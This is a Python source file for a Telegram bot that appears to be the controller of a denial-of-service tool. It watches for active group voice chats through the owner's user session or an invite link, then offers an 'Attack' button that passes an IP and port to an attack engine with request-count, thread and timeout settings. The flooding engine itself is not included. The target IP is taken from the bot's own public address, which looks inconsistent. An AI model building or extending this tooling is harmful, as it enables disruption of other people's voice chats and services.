import asyncio
import logging
import random
from typing import Optional, Dict, Any
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from pyrogram.errors import FloodWait, MessageNotModified
from pyrogram.enums import ParseMode

from config import Config, ATTACK_METHODS
from utils import get_public_ip, is_valid_ip, parse_ip_port, format_number, parse_telegram_invite_link
from vc_detector import VCInfo

logger = logging.getLogger(__name__)

# State management for user flows
user_states: Dict[int, Dict[str, Any]] = {}

class BotHandler:
    """Manages bot UI - all group operations delegated to vc_detector (user session)"""
    
    def __init__(self, bot: Client, attack_engine, admin_id: int, vc_detector=None):
        self.bot = bot  
        self.attack_engine = attack_engine
        self.admin_id = admin_id
        self.vc_detector = vc_detector  
        self.logger = logging.getLogger(__name__)
        
        self._register_handlers()
    
    def _register_handlers(self):
        """Register all message handlers"""
        
        @self.bot.on_message(filters.command("start") & filters.private)
        async def start_handler(client, message):
            if message.from_user.id != self.admin_id:
                await message.reply_text("⛔ <b>Unauthorized Access</b>", parse_mode=ParseMode.HTML)
                return
            
            user_states[message.from_user.id] = {}
            status = "🟢 <b>MONITORING</b>" if Config.MONITORING_MODE else "⚪ <b>STANDBY</b>"
            
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("📊 Status", callback_data="show_status"),
                 InlineKeyboardButton("🔗 Manual Target", callback_data="manual_target")]
            ])
            
            text = (
                "🤖 <b>VC Monitor Bot</b>\n\n"
                f"Status: {status}\n"
                "Uses your User Session to join groups and detect VCs\n\n"
                "<b>How to use:</b>\n"
                "1. Join a Voice Chat in any group\n"
                "2. Bot will auto-detect via your user session\n"
                "3. Or use Manual Target to send invite link\n\n"
                "<b>Configuration:</b>\n"
                f"├ Max Requests: <code>{format_number(Config.MAX_REQUESTS)}</code>\n"
                f"├ Threads: <code>{Config.THREAD_COUNT}</code>\n"
                f"├ Timeout: <code>{Config.ATTACK_TIMEOUT}s</code>\n"
                f"└ Check Interval: <code>{Config.VC_CHECK_INTERVAL}s</code>"
            )
            await message.reply_text(text, reply_markup=keyboard, parse_mode=ParseMode.HTML)

        @self.bot.on_callback_query(filters.regex("^manual_target$"))
        async def manual_target_callback(client, callback: CallbackQuery):
            if callback.from_user.id != self.admin_id: return
            user_states[callback.from_user.id] = {'state': 'waiting_for_invite_link'}
            await callback.edit_message_text(
                "🔗 <b>Manual Target</b>\n\nSend Telegram Group Invite Link or <code>IP:PORT</code>",
                parse_mode=ParseMode.HTML
            )

        @self.bot.on_message(filters.private & filters.text)
        async def handle_text_input(client, message):
            if message.from_user.id != self.admin_id: return
            state = user_states.get(message.from_user.id, {}).get('state')
            
            if state == 'waiting_for_invite_link':
                await self._process_invite_link_input(message, message.text)

        @self.bot.on_callback_query(filters.regex(r"^attack_(.+)$"))
        async def attack_execution_callback(client, callback: CallbackQuery):
            if callback.from_user.id != self.admin_id: return
            data = callback.data.split("_")
            # data: ['attack', 'ip', 'port', 'id', 'yes']
            ip, port = data[1], data[2]
            
            await callback.edit_message_text(f"🚀 <b>Attack Started!</b>\nTarget: <code>{ip}:{port}</code>", parse_mode=ParseMode.HTML)
            # Yahan aapka attack_engine trigger hoga
            asyncio.create_task(self.attack_engine.start(ip, int(port)))

        @self.bot.on_callback_query(filters.regex("^attack_cancel$"))
        async def cancel_attack_callback(client, callback: CallbackQuery):
            if callback.from_user.id != self.admin_id: return
            user_states.pop(callback.from_user.id, None)
            await callback.edit_message_text("❌ <b>Cancelled</b>", parse_mode=ParseMode.HTML)

    async def notify_vc_detected(self, vc_info: VCInfo):
        """Notify admin when VC detected via monitoring"""
        try:
            server_ip = get_public_ip()
            unique_id = random.randint(1000, 9999)
            keyboard = InlineKeyboardMarkup([[
                InlineKeyboardButton("✅ Attack", callback_data=f"attack_{server_ip}_{Config.ATTACK_PORT}_{unique_id}_yes"),
                InlineKeyboardButton("❌ Cancel", callback_data="attack_cancel")
            ]])
            text = (
                "🔍 <b>Voice Chat Auto-Detected!</b>\n\n"
                f"📍 Group: <code>{vc_info.chat_title}</code>\n"
                f"👥 Participants: {vc_info.participants_count}\n"
                f"🌐 Target: <code>{server_ip}:{Config.ATTACK_PORT}</code>"
            )
            await self.bot.send_message(self.admin_id, text, reply_markup=keyboard, parse_mode=ParseMode.HTML)
        except Exception as e:
            self.logger.error(f"Notify VC error: {e}")

    async def _process_invite_link_input(self, message, link: str):
        user_id = message.from_user.id
        if not self.vc_detector:
            await message.reply_text("❌ VC Detector not initialized!")
            return

        processing_msg = await message.reply_text("⏳ <b>Processing via User Session...</b>", parse_mode=ParseMode.HTML)
        
        try:
            result = await self.vc_detector.process_invite_link(link)
            if not result:
                await processing_msg.edit_text("❌ <b>Failed to process link!</b>", parse_mode=ParseMode.HTML)
                return

            chat_id, chat_title, vc_info = result
            if not vc_info or not vc_info.is_active:
                await processing_msg.edit_text(f"⚠️ No active VC in <b>{chat_title}</b>", parse_mode=ParseMode.HTML)
                return

            server_ip = get_public_ip()
            target_port = Config.ATTACK_PORT
            
            keyboard = InlineKeyboardMarkup([[
                InlineKeyboardButton("✅ YES - Attack", callback_data=f"attack_{server_ip}_{target_port}_{random.randint(1000,9999)}_yes"),
                InlineKeyboardButton("❌ Cancel", callback_data="attack_cancel")
            ]])

            await processing_msg.edit_text(
                f"✅ <b>Voice Chat Found!</b>\n\nGroup: <code>{chat_title}</code>\nTarget: <code>{server_ip}:{target_port}</code>",
                reply_markup=keyboard,
                parse_mode=ParseMode.HTML
            )
        except Exception as e:
            await processing_msg.edit_text(f"❌ Error: {str(e)}")
